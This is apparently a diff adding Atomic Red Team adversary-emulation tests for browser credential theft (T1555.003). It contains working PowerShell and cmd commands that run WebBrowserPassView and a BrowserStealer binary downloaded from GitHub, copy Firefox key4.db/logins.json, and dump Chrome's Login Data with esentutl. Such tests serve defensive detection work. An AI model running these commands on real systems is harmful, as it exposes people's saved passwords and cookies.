+                            }
+                        ],
+                        "executor": {
+                            "command": "Start-Process \"#{webbrowserpassview_path}\"\nStart-Sleep -Second 4\nStop-Process -Name \"WebBrowserPassView\"\n",
+                            "name": "powershell",
+                            "elevation_required": true
+                        }
+                    },
+                    {
+                        "name": "BrowserStealer (Chrome / Firefox / Microsoft Edge)",
+                        "auto_generated_guid": "6f2c5c87-a4d5-4898-9bd1-47a55ecaf1dd",
+                        "description": "[Github Repo](https://github.com/SaulBerrenson/BrowserStealer) Simple password/cookies stealer for chrome, edge, and gecko based browsers (30 listed working). This attack simulates stealing the data from the browser files and printing them to the command line.\nIf using to test with Firefox, if the browser is x64 you need to use the x64 build\n",
+                        "supported_platforms": [
+                            "windows"
+                        ],
+                        "dependency_executor_name": "powershell",
+                        "dependencies": [
+                            {
+                                "description": "Firefox must be on the device.\n",
+                                "prereq_command": "if ((Test-Path \"C:\\Program Files\\Mozilla Firefox\\firefox.exe\") -Or (Test-Path \"C:\\Program Files (x86)\\Mozilla Firefox\\firefox.exe\")) {exit 0} else {exit 1}\n",
+                                "get_prereq_command": "New-Item -Type Directory \"PathToAtomicsFolder\\..\\ExternalPayloads\\\" -ErrorAction Ignore -Force | Out-Null\n$installer = \"PathToAtomicsFolder\\..\\ExternalPayloads\\FirefoxStubInstaller.exe\"\nInvoke-WebRequest -OutFile $installer \"https://download.mozilla.org/?product=firefox-stub&os=win&lang=en-US\"\nStart-Process -FilePath $installer -Wait\nStop-Process -Name \"firefox\"\n"
+                            },
+                            {
+                                "description": "BrowserCollector must exist in the bin directory\n",
+                                "prereq_command": "if (Test-Path \"PathToAtomicsFolder\\T1555.003\\bin\\BrowserCollector.exe\") {exit 0} else {exit 1}\n",
+                                "get_prereq_command": "New-Item -Type Directory \"PathToAtomicsFolder\\T1555.003\\bin\\\" -ErrorAction Ignore -Force | Out-Null\nInvoke-WebRequest \"https://github.com/SaulBerrenson/BrowserStealer/releases/download/1.0.0.4/BrowserCollector_x64.exe\" -Outfile: \"PathToAtomicsFolder\\T1555.003\\bin\\BrowserCollector.exe\""
+                            },
+                            {
+                                "description": "Login Data file that is a copy of a Firefox Login Data that contains credentials for the tool to \"steal.\" Must exist at the specified path.\n",
+                                "prereq_command": "if (Test-Path \"PathToAtomicsFolder\\T1555.003\\src\\key4.db\") {exit 0} else {exit 1}",
+                                "get_prereq_command": "Invoke-WebRequest \"https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1555.003/src/key4.db?raw=true\" -Outfile: \"PathToAtomicsFolder\\T1555.003\\src\\key4.db\"\nInvoke-WebRequest \"https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1555.003/src/logins.json?raw=true\" -Outfile: \"PathToAtomicsFolder\\T1555.003\\src\\logins.json\" "
+                            }
+                        ],
+                        "executor": {
+                            "command": "$profile = (Gci -filter \"*default-release*\" -path $env:Appdata\\Mozilla\\Firefox\\Profiles\\).FullName\nCopy-Item $profile\\key4.db -Destination \"PathToAtomicsFolder\\..\\ExternalPayloads\" > $null\nCopy-Item $profile\\logins.json -Destination \"PathToAtomicsFolder\\..\\ExternalPayloads\" > $null\nRemove-Item $profile\\key4.db > $null\nRemove-Item $profile\\logins.json > $null\nCopy-Item \"$env:PathToAtomicsFolder\\T1555.003\\src\\key4.db\" -Destination $profile\\ > $null\nCopy-Item \"$env:PathToAtomicsFolder\\T1555.003\\src\\logins.json\" -Destination $profile\\ > $null\ncd \"$env:PathToAtomicsFolder\\T1555.003\\bin\"\n\"\"|.\\BrowserCollector.exe\n",
+                            "cleanup_command": "$profile = (Gci -filter \"*default-release*\" -path $env:Appdata\\Mozilla\\Firefox\\Profiles\\).FullName\nRemove-Item $profile\\key4.db > $null\nRemove-Item $profile\\logins.json > $null\nCopy-Item \"PathToAtomicsFolder\\..\\ExternalPayloads\" -Destination $profile\\ > $null\nRemove-Item \"PathToAtomicsFolder\\..\\ExternalPayloads\\key4.db\" > $null\nRemove-Item \"PathToAtomicsFolder\\..\\ExternalPayloads\\logins.json\" > $null\n",
+                            "name": "powershell"
+                        }
+                    },
+                    {
+                        "name": "Dump Chrome Login Data with esentutl",
+                        "auto_generated_guid": "70422253-8198-4019-b617-6be401b49fce",
+                        "description": "This test simulates an adversary using esentutl to dump encrypted credentials from Google Chrome's Login database.\n[Reference](https://actzero.ai/resources/blog/hygiene-tip-shut-down-attackers-harvesting-cached-browser-credentials/)\n",
+                        "supported_platforms": [
+                            "windows"
+                        ],
+                        "input_arguments": {
+                            "output_path": {
+                                "description": "File path for login data dump",
+                                "type": "string",
+                                "default": "%temp%\\T1555.003_Login_Data.tmp"
+                            }
+                        },
+                        "dependency_executor_name": "powershell",
+                        "dependencies": [
+                            {
+                                "description": "Chrome must be installed\n",
+                                "prereq_command": "if ((Test-Path \"C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe\") -Or (Test-Path \"C:\\Program Files (x86)\\Google\\Chrome\\Application\\chrome.exe\")) {exit 0} else {exit 1}",
+                                "get_prereq_command": "New-Item -Type Directory \"PathToAtomicsFolder\\..\\ExternalPayloads\\\" -ErrorAction Ignore -Force | Out-Null\n$installer = \"PathToAtomicsFolder\\..\\ExternalPayloads\\ChromeStandaloneSetup64.msi\"\nInvoke-WebRequest -OutFile \"PathToAtomicsFolder\\..\\ExternalPayloads\\ChromeStandaloneSetup64.msi\" https://dl.google.com/chrome/install/googlechromestandaloneenterprise64.msi\nmsiexec /i $installer /qn\nStart-Process -FilePath \"chrome.exe\"\nStop-Process -Name \"chrome\"\n"
+                            }
+                        ],
+                        "executor": {
+                            "name": "command_prompt",
+                            "command": "esentutl.exe /y \"%LOCALAPPDATA%\\Google\\Chrome\\User Data\\Default\\Login Data\" /d \"#{output_path}\"\n",
+                            "cleanup_command": "del /f /q #{output_path} > nul 2>&1\n"
+                        }
+                    }
+                ]
+            }
+        ]
+    },
+    "timestamp": "2025-02-28 16:16:09"
+}
